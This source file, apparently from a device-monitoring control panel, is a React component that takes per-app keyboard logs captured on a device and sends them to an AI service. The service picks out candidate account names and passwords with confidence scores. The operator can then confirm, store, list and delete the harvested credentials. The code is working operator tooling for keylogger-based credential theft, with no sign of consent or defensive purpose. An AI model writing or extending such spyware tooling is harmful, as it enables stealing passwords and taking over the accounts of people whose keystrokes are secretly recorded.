import { Alert, Button, Checkbox, Modal, Table, message } from "antd";
import { useCallback, useEffect, useState, type ReactNode } from "react";
import {
  batchSaveAppAccounts,
  batchSaveAppPasswords,
  deleteAppAccount,
  deleteAppPassword,
  extractAccountsFromKeyboard,
  extractPasswordsFromKeyboard,
  fetchAppAccounts,
  fetchAppPasswords,
  fetchKeyboardLogs,
  type AccountExtractCandidate,
  type PasswordExtractCandidate,
} from "../api/client";
import type { DeviceAppAccountRecord, DeviceAppPasswordRecord } from "../types";
import { formatDateTime } from "../utils/format";
import { useI18n, t } from "../i18n";


type DetailTab = "keyboard" | "accounts" | "passwords";
type ExtractFeedback =
  | { type: "success" | "info" | "error" | "warning"; text: string }
  | null;

interface DeviceAppCredentialPanelProps {
  deviceId: string;
  packageName: string;
  appLabel: string;
  activeTab: DetailTab;
  keyboardContent: ReactNode;
}

function mapAiError(text: string) {
  if (text === "ai_disabled") {
    return t("AI 未启用：请到左侧「AI 配置」打开「启用 AI」并保存");
  }
  if (text === "ai_api_key_missing") {
    return t("请先在「AI 配置」中填写 API Key 并保存");
  }
  if (text === "keyboard_logs_empty") {
    return t("该应用在库中没有可分析的键盘记录（请先切到「键盘记录」Tab 确认有数据）");
  }
  if (text === "model_required") {
    return t("AI 模型未配置，请到「AI 配置」选择模型并保存");
  }
  if (text.startsWith("apiyi_request_failed:")) {
    return t("APIYI 调用失败：{0}", { 0: text.replace("apiyi_request_failed:", "").trim() });
  }
  return text;
}

export function DeviceAppCredentialPanel({
  deviceId,
  packageName,
  appLabel,
  activeTab,
  keyboardContent,
}: DeviceAppCredentialPanelProps) {
  const { locale } = useI18n();
  const [accounts, setAccounts] = useState<DeviceAppAccountRecord[]>([]);
  const [passwords, setPasswords] = useState<DeviceAppPasswordRecord[]>([]);
  const [loadingAccounts, setLoadingAccounts] = useState(false);
  const [loadingPasswords, setLoadingPasswords] = useState(false);
  const [extractingAccounts, setExtractingAccounts] = useState(false);
  const [extractingPasswords, setExtractingPasswords] = useState(false);
  const [accountConfirmOpen, setAccountConfirmOpen] = useState(false);
  const [passwordConfirmOpen, setPasswordConfirmOpen] = useState(false);
  const [accountCandidates, setAccountCandidates] = useState<AccountExtractCandidate[]>([]);
  const [passwordCandidates, setPasswordCandidates] = useState<PasswordExtractCandidate[]>([]);
  const [selectedAccounts, setSelectedAccounts] = useState<string[]>([]);
  const [selectedPasswordKeys, setSelectedPasswordKeys] = useState<string[]>([]);
  const [applying, setApplying] = useState(false);
  const [deletingId, setDeletingId] = useState<string | null>(null);
  const [extractFeedback, setExtractFeedback] = useState<ExtractFeedback>(null);

  const loadAccounts = useCallback(async () => {
    setLoadingAccounts(true);
    try {
      const list = await fetchAppAccounts(deviceId, packageName);
      setAccounts(list);
    } catch (error) {
      message.error(error instanceof Error ? error.message : t("加载账号失败"));
      setAccounts([]);
    } finally {
      setLoadingAccounts(false);
    }
  }, [locale, deviceId, packageName]);

  const loadPasswords = useCallback(async () => {
    setLoadingPasswords(true);
    try {
      const list = await fetchAppPasswords(deviceId, packageName);
      setPasswords(list);
    } catch (error) {
      message.error(error instanceof Error ? error.message : t("加载密码失败"));
      setPasswords([]);
    } finally {
      setLoadingPasswords(false);
    }
  }, [locale, deviceId, packageName]);

  useEffect(() => {
    setExtractFeedback(null);
    if (activeTab === "accounts") {
      void loadAccounts();
    }
    if (activeTab === "passwords") {
      void loadPasswords();
    }
  }, [activeTab, loadAccounts, loadPasswords, packageName]);

  async function ensureKeyboardLogsExist() {
    const page = await fetchKeyboardLogs(deviceId, 1, packageName, 1);
    if (page.total <= 0) {
      throw new Error("keyboard_logs_empty");
    }
    return page.total;
  }

  async function handleExtractAccounts() {
    setExtractingAccounts(true);
    setExtractFeedback(null);
    try {
      const total = await ensureKeyboardLogsExist();
      const result = await extractAccountsFromKeyboard({
        deviceId,
        packageName,
        appLabel,
      });
      const next = result.candidates ?? [];
      if (next.length === 0) {
        const text = t("已扫描 {0}/{1} 条键盘记录，未识别到账号", { 0: result.scanned, 1: total });
        setExtractFeedback({ type: "info", text });
        message.info(text);
        return;
      }
      setAccountCandidates(next);
      setSelectedAccounts(
        next.filter((item) => item.selectedByDefault).map((item) => item.account),
      );
      setAccountConfirmOpen(true);
      setExtractFeedback({
        type: "success",
        text: t("识别到 {0} 个候选账号，请在弹窗中勾选确认", { 0: next.length }),
      });
    } catch (error) {
      const text = mapAiError(error instanceof Error ? error.message : t("提取失败"));
      setExtractFeedback({ type: "error", text });
      message.error(text);
    } finally {
      setExtractingAccounts(false);
    }
  }

  async function handleExtractPasswords() {
    setExtractingPasswords(true);
    setExtractFeedback(null);
    try {
      const total = await ensureKeyboardLogsExist();
      const result = await extractPasswordsFromKeyboard({
        deviceId,
        packageName,
        appLabel,
      });
      const next = result.candidates ?? [];
      if (next.length === 0) {
        const text = t("已扫描 {0}/{1} 条键盘记录，未识别到密码", { 0: result.scanned, 1: total });
        setExtractFeedback({ type: "info", text });
        message.info(text);
        return;
      }
      setPasswordCandidates(next);
      setSelectedPasswordKeys(
        next
          .filter((item) => item.selectedByDefault)
          .map((item) => `${item.password}||${item.relatedAccount}`),
      );
      setPasswordConfirmOpen(true);
      setExtractFeedback({
        type: "success",
        text: t("识别到 {0} 个候选密码，请在弹窗中勾选确认", { 0: next.length }),
      });
    } catch (error) {
      const text = mapAiError(error instanceof Error ? error.message : t("提取失败"));
      setExtractFeedback({ type: "error", text });
      message.error(text);
    } finally {
      setExtractingPasswords(false);
    }
  }

  async function handleConfirmAccounts() {
    const selected = accountCandidates.filter((item) =>
      selectedAccounts.includes(item.account),
    );
    if (selected.length === 0) {
      message.warning(t("请至少勾选一个账号"));
      return;
    }
    setApplying(true);
    try {
      await batchSaveAppAccounts(
        deviceId,
        packageName,
        selected.map((item) => ({
          account: item.account,
          confidence: item.confidence,
          reason: item.reason,
        })),
      );
      message.success(t("已保存 {0} 个账号", { 0: selected.length }));
      setAccountConfirmOpen(false);
      setAccountCandidates([]);
      setSelectedAccounts([]);
      await loadAccounts();
    } catch (error) {
      message.error(error instanceof Error ? error.message : t("保存失败"));
    } finally {
      setApplying(false);
    }
  }

  async function handleConfirmPasswords() {
    const selected = passwordCandidates.filter((item) =>
      selectedPasswordKeys.includes(`${item.password}||${item.relatedAccount}`),
    );
    if (selected.length === 0) {
      message.warning(t("请至少勾选一个密码"));
      return;
    }
    setApplying(true);
    try {
      await batchSaveAppPasswords(
        deviceId,
        packageName,
        selected.map((item) => ({
          password: item.password,
          relatedAccount: item.relatedAccount,
          confidence: item.confidence,
          reason: item.reason,
        })),
      );
      message.success(t("已保存 {0} 个密码", { 0: selected.length }));
      setPasswordConfirmOpen(false);
      setPasswordCandidates([]);
      setSelectedPasswordKeys([]);
      await loadPasswords();
    } catch (error) {
      message.error(error instanceof Error ? error.message : t("保存失败"));
    } finally {
      setApplying(false);
    }
  }

  async function handleDeleteAccount(id: string) {
    setDeletingId(id);
    try {
      await deleteAppAccount(id);
      message.success(t("已删除账号"));
      await loadAccounts();
    } catch (error) {
      message.error(error instanceof Error ? error.message : t("删除失败"));
    } finally {
      setDeletingId(null);
    }
  }

  async function handleDeletePassword(id: string) {
    setDeletingId(id);
    try {
      await deleteAppPassword(id);
      message.success(t("已删除密码"));
      await loadPasswords();
    } catch (error) {
      message.error(error instanceof Error ? error.message : t("删除失败"));
    } finally {
      setDeletingId(null);
    }
  }

  if (activeTab === "keyboard") {
    return <>{keyboardContent}</>;
  }

  if (activeTab === "accounts") {
    return (
      <>
        <div className="device-app-list-cred-toolbar">
          <Button
            type="primary"
            loading={extractingAccounts}
            onClick={() => void handleExtractAccounts()}
          >
            {t("AI 提取账号")}
          </Button>
          <Button loading={loadingAccounts} onClick={() => void loadAccounts()}>
            {t("刷新")}
          </Button>
        </div>
        {extractFeedback ? (
          <div className="device-app-list-cred-feedback">
            <Alert showIcon type={extractFeedback.type} message={extractFeedback.text} />
          </div>
        ) : null}
        {loadingAccounts && accounts.length === 0 ? (
          <div className="device-app-list-empty">{t("加载账号中…")}</div>
        ) : accounts.length === 0 ? (
          <div className="device-app-list-empty">{t("暂无账号，可点「AI 提取账号」从本应用键盘记录分析")}</div>
        ) : (
          <div className="device-app-list-keyboard-wrap">
            <table className="device-app-list-keyboard-table">
              <thead>
                <tr>
                  <th>{t("账号")}</th>
                  <th>{t("置信度")}</th>
                  <th>{t("来源")}</th>
                  <th>{t("时间")}</th>
                  <th>{t("操作")}</th>
                </tr>
              </thead>
              <tbody>
                {accounts.map((item) => (
                  <tr key={item.id}>
                    <td className="device-app-list-keyboard-text">{item.account}</td>
                    <td>
                      {item.confidence != null ? item.confidence.toFixed(2) : "-"}
                    </td>
                    <td>{item.source === "ai" ? "AI" : t("手动")}</td>
                    <td>{formatDateTime(item.createdAt)}</td>
                    <td>
                      <Button
                        size="small"
                        danger
                        loading={deletingId === item.id}
                        onClick={() => void handleDeleteAccount(item.id)}
                      >
                        {t("删除")}
                      </Button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}

        <Modal
          title={t("AI 识别账号 — 确认保存")}
          open={accountConfirmOpen}
          zIndex={12000}
          getContainer={() => document.body}
          onCancel={() => {
            if (!applying) {
              setAccountConfirmOpen(false);
            }
          }}
          width={680}
          destroyOnClose
          footer={[
            <Button
              key="high"
              disabled={applying}
              onClick={() =>
                setSelectedAccounts(
                  accountCandidates
                    .filter((item) => item.selectedByDefault)
                    .map((item) => item.account),
                )
              }
            >
              {t("全选高置信")}
            </Button>,
            <Button
              key="all"
              disabled={applying}
              onClick={() =>
                setSelectedAccounts(accountCandidates.map((item) => item.account))
              }
            >
              {t("全选")}
            </Button>,
            <Button
              key="cancel"
              disabled={applying}
              onClick={() => setAccountConfirmOpen(false)}
            >
              {t("取消")}
            </Button>,
            <Button
              key="ok"
              type="primary"
              loading={applying}
              onClick={() => void handleConfirmAccounts()}
            >
              {t("确认保存 (")}{selectedAccounts.length})
            </Button>,
          ]}
        >
          <p className="device-app-list-hint">
            {t("仅分析当前应用键盘记录。置信度 ≥ 0.8 默认勾选。")}
          </p>
          <Table
            size="small"
            rowKey="account"
            pagination={false}
            scroll={{ y: 320 }}
            dataSource={accountCandidates}
            columns={[
              {
                title: (
                  <Checkbox
                    checked={
                      accountCandidates.length > 0 &&
                      selectedAccounts.length === accountCandidates.length
                    }
                    indeterminate={
                      selectedAccounts.length > 0 &&
                      selectedAccounts.length < accountCandidates.length
                    }
                    onChange={(event) => {
                      setSelectedAccounts(
                        event.target.checked
                          ? accountCandidates.map((item) => item.account)
                          : [],
                      );
                    }}
                  />
                ),
                width: 48,
                render: (_: unknown, row: AccountExtractCandidate) => (
                  <Checkbox
                    checked={selectedAccounts.includes(row.account)}
                    onChange={(event) => {
                      setSelectedAccounts((current) => {
                        if (event.target.checked) {
                          return current.includes(row.account)
                            ? current
                            : [...current, row.account];
                        }
                        return current.filter((item) => item !== row.account);
                      });
                    }}
                  />
                ),
              },
              { title: t("账号"), dataIndex: "account", ellipsis: true },
              {
                title: t("置信度"),
                dataIndex: "confidence",
                width: 88,
                render: (value: number) => value.toFixed(2),
              },
              { title: t("原因"), dataIndex: "reason", ellipsis: true },
            ]}
          />
        </Modal>
      </>
    );
  }

  return (
    <>
      <div className="device-app-list-cred-toolbar">
        <Button
          type="primary"
          loading={extractingPasswords}
          onClick={() => void handleExtractPasswords()}
        >
          {t("AI 提取密码")}
        </Button>
        <Button loading={loadingPasswords} onClick={() => void loadPasswords()}>
          {t("刷新")}
        </Button>
      </div>
      {extractFeedback ? (
        <div className="device-app-list-cred-feedback">
          <Alert showIcon type={extractFeedback.type} message={extractFeedback.text} />
        </div>
      ) : null}
      {loadingPasswords && passwords.length === 0 ? (
        <div className="device-app-list-empty">{t("加载密码中…")}</div>
      ) : passwords.length === 0 ? (
        <div className="device-app-list-empty">{t("暂无密码，可点「AI 提取密码」从本应用键盘记录分析")}</div>
      ) : (
        <div className="device-app-list-keyboard-wrap">
          <table className="device-app-list-keyboard-table">
            <thead>
              <tr>
                <th>{t("密码")}</th>
                <th>{t("关联账号")}</th>
                <th>{t("置信度")}</th>
                <th>{t("来源")}</th>
                <th>{t("时间")}</th>
                <th>{t("操作")}</th>
              </tr>
            </thead>
            <tbody>
              {passwords.map((item) => (
                <tr key={item.id}>
                  <td className="device-app-list-keyboard-text">{item.password}</td>
                  <td>{item.relatedAccount || "-"}</td>
                  <td>
                    {item.confidence != null ? item.confidence.toFixed(2) : "-"}
                  </td>
                  <td>{item.source === "ai" ? "AI" : t("手动")}</td>
                  <td>{formatDateTime(item.createdAt)}</td>
                  <td>
                    <Button
                      size="small"
                      danger
                      loading={deletingId === item.id}
                      onClick={() => void handleDeletePassword(item.id)}
                    >
                      {t("删除")}
                    </Button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      <Modal
        title={t("AI 识别密码 — 确认保存")}
        open={passwordConfirmOpen}
        zIndex={12000}
        getContainer={() => document.body}
        onCancel={() => {
          if (!applying) {
            setPasswordConfirmOpen(false);
          }
        }}
        width={760}
        destroyOnClose
        footer={[
          <Button
            key="high"
            disabled={applying}
            onClick={() =>
              setSelectedPasswordKeys(
                passwordCandidates
                  .filter((item) => item.selectedByDefault)
                  .map((item) => `${item.password}||${item.relatedAccount}`),
              )
            }
          >
            {t("全选高置信")}
          </Button>,
          <Button
            key="all"
            disabled={applying}
            onClick={() =>
              setSelectedPasswordKeys(
                passwordCandidates.map(
                  (item) => `${item.password}||${item.relatedAccount}`,
                ),
              )
            }
          >
            {t("全选")}
          </Button>,
          <Button
            key="cancel"
            disabled={applying}
            onClick={() => setPasswordConfirmOpen(false)}
          >
            {t("取消")}
          </Button>,
          <Button
            key="ok"
            type="primary"
            loading={applying}
            onClick={() => void handleConfirmPasswords()}
          >
            {t("确认保存 (")}{selectedPasswordKeys.length})
          </Button>,
        ]}
      >
        <p className="device-app-list-hint">
          {t("仅分析当前应用键盘记录。置信度 ≥ 0.8 默认勾选。")}
        </p>
        <Table
          size="small"
          rowKey={(row) => `${row.password}||${row.relatedAccount}`}
          pagination={false}
          scroll={{ y: 320 }}
          dataSource={passwordCandidates}
          columns={[
            {
              title: (
                <Checkbox
                  checked={
                    passwordCandidates.length > 0 &&
                    selectedPasswordKeys.length === passwordCandidates.length
                  }
                  indeterminate={
                    selectedPasswordKeys.length > 0 &&
                    selectedPasswordKeys.length < passwordCandidates.length
                  }
                  onChange={(event) => {
                    setSelectedPasswordKeys(
                      event.target.checked
                        ? passwordCandidates.map(
                            (item) => `${item.password}||${item.relatedAccount}`,
                          )
                        : [],
                    );
                  }}
                />
              ),
              width: 48,
              render: (_: unknown, row: PasswordExtractCandidate) => {
                const key = `${row.password}||${row.relatedAccount}`;
                return (
                  <Checkbox
                    checked={selectedPasswordKeys.includes(key)}
                    onChange={(event) => {
                      setSelectedPasswordKeys((current) => {
                        if (event.target.checked) {
                          return current.includes(key) ? current : [...current, key];
                        }
                        return current.filter((item) => item !== key);
                      });
                    }}
                  />
                );
              },
            },
            { title: t("密码"), dataIndex: "password", ellipsis: true },
            {
              title: t("关联账号"),
              dataIndex: "relatedAccount",
              ellipsis: true,
              render: (value: string) => value || "-",
            },
            {
              title: t("置信度"),
              dataIndex: "confidence",
              width: 88,
              render: (value: number) => value.toFixed(2),
            },
            { title: t("原因"), dataIndex: "reason", ellipsis: true },
          ]}
        />
      </Modal>
    </>
  );
}
